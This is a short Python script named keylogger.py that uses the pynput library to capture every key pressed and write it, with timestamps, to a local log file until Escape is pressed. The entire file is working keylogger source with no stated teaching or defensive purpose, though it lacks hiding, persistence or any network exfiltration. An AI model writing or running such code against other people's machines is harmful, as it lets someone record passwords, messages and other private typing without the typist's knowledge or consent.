# keylogger.py
from pynput import keyboard
import logging
from datetime import datetime

# Create a filename based on timestamp
timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
log_file = f"keylog_{timestamp}.txt"

# Setup basic configuration for logging keystrokes
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening to the keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
